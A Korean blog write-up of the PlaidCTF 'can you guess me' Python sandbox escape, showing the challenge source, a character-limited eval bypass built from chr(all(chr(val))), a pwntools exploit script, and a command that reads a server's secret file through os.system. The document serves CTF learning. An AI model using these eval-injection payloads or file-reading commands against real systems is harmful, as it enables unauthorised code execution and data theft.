---
layout: post
title: "[PlaidCTF] can you guess me"
comments: true
excerpt_separator: <!--more-->
tags:
  - Write-up
  - CTF
  - python sandbox
  - MyriaBreak
---

```
Here's the source to a guessing game: here
You can access the server at
nc canyouguessme.pwni.ng 12349
```

문제자체는 간단한 `Python Sandbox Escape`문제이다. 문제를 소스를 살펴보면 아래와 같다.

<!--more-->

```python
from sys import exit
from secret import secret_value_for_password, flag, exec

print(r"")
print(r"")
print(r"  ____         __   __           ____                     __  __       ")
print(r" / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  ")
print(r"| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \ ")
print(r"| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/ ")
print(r" \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___| ")
print(r"                                                                       ")
print(r"")
print(r"")

try:
    val = 0
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:          # Make sure it is a number
        val = eval(inp)
    else:
        raise

    if val == secret_value_for_password:
        print(flag)
    else:
        print("Nope. Better luck next time.")
except:
    print("Nope. No hacking.")
    exit(1)
```

사용자로부터 입력을 받아 이를 `eval(inp)`를 통해 실행시켜줍니다. 이 때 입력에 사용된 문자의 종류는 `10개이하`라는 제약이 있습니다.

`python`의 `Built-in Functions`인 `eval()`함수는 입력값으로 들어온 문자열을 `python`에서 실행한 결과값을 반환해줍니다. `eval()`과 같은 동작을 하는 `Built-in Functions`함수인 `exec()`는 `secret`에서 import되어 사용할 수 없습니다.

```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|


Input value: exec("1+1")

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@                                      @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@   @@@@@@@@@@@@@  @@@@@@@@@    %@@@@@@@@@        @@@@@@@@@@@@@@@@
@@@@@@@@@@@@  @@@@@@@@@@  @@@@@@@        @@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@
@@@@@@@@@@%  @@@@@@@@ @@@, @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@
@@@@@@@@@  @@@@@@@ @@@ @@  @@@@@@@@@@@ @@@@@@@@@@% (@@@@@@@ (@@@@@@@@  (@@@@@@@
@@@@@@@@  @@@@@@@@@@@@*@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@ @@@@@@@  @@@@@@@
@@@@@@@  @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@  @@@@@@@
@@@@@*  @@@@@@@@@@@@@@@          @@    @@@@@@@@@@@&@@#       @@@@@@@@@@   @@@@@
@@@   ,@@&(%@@@@@ @@@              @@@@  @@@@@@@@@             @     .@@@   @@@
@&  @@@@@@      @@@@@@@@@@@@@ @@@@@     @@@@@@@,     #@@@@@@@@@@@@@@@@@@ @@  @@
  @.@@@   @@@@@@     @@@@#   @@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@     %@@&@ @  @
 @@ @@  @@@@@  @@@@@@@%,(@@@@@@@@@@@@@@@@@@@@@@@@. @@@@@@@      .@@@@  @ @@@  @
 @@ @@ @@@@@      @@@@@@@@@@@@@@@@ @@   @@@@@@@@@@@   @@@@@@@@@@@( @@@@@@@@@  @
 @@ @@  @     @@@@    (@@@@@(@@@@@@  @@@@@@@@@@@@@@@@    @@@@@@@@   @@@ @@   @@
  @@@@* @@@@@  @@@@@@       @@@@@@@  @@      @@@@@@@  @ @@@ @@@@    @@@@ @  @@@
@  @@ @@@@@@@     @@@@ @@@@@       @@@@@@@@@@@@     @@@@@@@@@@       @@@@  @@@@
@@   ,@@@@@@@@@  @       @@@@@@@@          @@@@@@@@@@@@@@       @    @@@@  @@@@
@@@@   @@@@@@@@@  @@@        @@@@  @@@@@@@@             @@  @@@  @   @@@@ @@@@@
@@@@@@  @@@@@@@@@@  @@  @@         @@@@@@@@  @@@@@, @@@@@@  @@       @@@@ @@@@@
@@@@@@@  @@@@@@@@@@    @@@@@@@@                                      @@@@ @@@@@
@@@@@@@@  @@@@@@@@@@@(  @@@@@@@@ @@@@@                               @@@& @@@@@
@@@@@@@@@/  @@@@@@@@@@@@   @@@@  @@@@@@@@@ @@@@,               &    @@@@@ @@@@@
@@@@@@@@@@@   @@@@@@@@@@@@@     @@@@@@@@@@ @@@@@@% @@@@  @@* ,@    @@@@@@ @@@@@
@@@@@@@@@@@@@   @@@ @@@@ @@@@@@      @@@@  @@@@@@  @@@  ,@@      @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@   %@@@ @@@@ @@@@@@@@@@                   .@@@@@@@@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@    @@@@ *@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@@@@@    .@@@@@ %@@@@  /@@@@@@@@@@@@@@@@@@@ @@@@@@.@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&    @@@@@@@@@/  @@@@@@@@@@@@@@@@@@@@@. @@@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@   @@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Nope. No hacking.
```

그러므로 우리는 `exec()`는 사용할 수 없습니다. 문자제약이 `10자`있으므로 우리는 `chr()`함수와 `1+1`을 사용해 통해 모든 문자들을 만들수있습니다.

현재 사용된 문자종류갯수 : 7

```python
>>> chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)
'#'
>>> chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)
'###'
>>> len(set("chr(1+1+1)"))
7
>>>
```

이제 `print(flag)` 문자열을 만들어 `eval()`함수로 감싸주면 `flag`가 출력될 것입니다. 그러나 여기서 `eval()`을 사용하면 글자종류가 초과됩니다.

```python
>>> inp = "eval(chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1))"
>>> eval(inp)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
>>> len(set(inp))
11
>>>
```

글자종류가 `11`이기 때문에 글자종류를 1개 줄일 필요가 있습니다. `eval`대신 `exec`를 사용하면 문제가 해결되지만, 위에서 봤다시피 `exec`는 사용할 수 없습니다. 그러면 `eval`을 사용하되 존재하는 문자종류를 줄일 필요가 있습니다.

여기서 우리는 `eval`을 보고 `val`라는 변수가 있었다는 것을 떠올릴 수 있습니다.

```python
try:
    val = 0
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:          # Make sure it is a number
        val = eval(inp)
    else:
        raise
```

여기서 `val`의 값은 0입니다. 그러나 `all`함수를 사용하면 `True`라는 값을 만들어낼 수 있습니다. `True`는 `1`로 사용할 수 있습니다.

```python
>>> all(chr(val))
True
>>> inp = "eval(chr(all(chr(val)))+chr(all(chr(val))))"
>>> eval(inp)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1

    ^
SyntaxError: invalid syntax
>>> len(set(inp))
10
>>>
```

멋집니다!! 쓸 수 있는 문자종류가 딱 `10`이 되었습니다. 이제 다음 커맨드를 실행할 수 있습니다. `print(flag)`

아래와 같은 `exploit code`를 작성할 수 있습니다.

```python
from pwn import *

conn = remote("canyouguessme.pwni.ng", 12349)

def make_payload(command):
	payload  = "eval("
	for i in command:
		payload += "chr("
		for j in range(0, ord(i)):
			payload += "all(chr(val))+"
		payload = payload[:-1]
		payload += ")+"
	payload = payload[:-1]
	payload  += ")"
	return payload


conn.recvuntil("Input value: ")
payload = make_payload("print(flag)")
conn.sendline(payload)

conn.interactive()
```

위 코드를 실행하면 아래와 같이 플래그를 획득 할 수 있습니다.

```
[+] Opening connection to canyouguessme.pwni.ng on port 12349: Done
[*] Switching to interactive mode
PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}
Nope. Better luck next time.
[*] Got EOF while reading in interactive
$  
```
추가로 `__import__("os").system("cat /home/guessme/secret.py")` 와 같이 커맨드를 실행하면 `secret.py`를 통째로 볼 수 있습니다. 


## unintend solution

대회가 끝난 후, 다른 사람들의 write-up을 통해 `unintend solution`이 있다는 것을 알았습니다. `help(flag)`나 `print(vars())`는 둘다 `10`종류 미만의 문자로 이루어져있습니다.

두 커맨드를 입력하면 `flag`를 얻을 수 있습니다.

**help(flag)**
```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|



Input value: help(flag)
No Python documentation found for 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}'.
Use help() to get the interactive help utility.
Use help(str) for help on the str class.

Nope. Better luck next time.
```

**print(vars())**
```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|



Input value: print(vars())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f3fb742e9e8>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/guessme/can-you-guess-me.py', '__cached__': None, 'exit': <built-in function exit>, 'secret_value_for_password': 'not even a number; this is a damn string; and it has all 26 characters of the alphabet; abcdefghijklmnopqrstuvwxyz; lol', 'flag': 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}', 'exec': <function exec at 0x7f3fb7377158>, 'val': 0, 'inp': 'print(vars())', 'count_digits': 10}
Nope. Better luck next time.
```
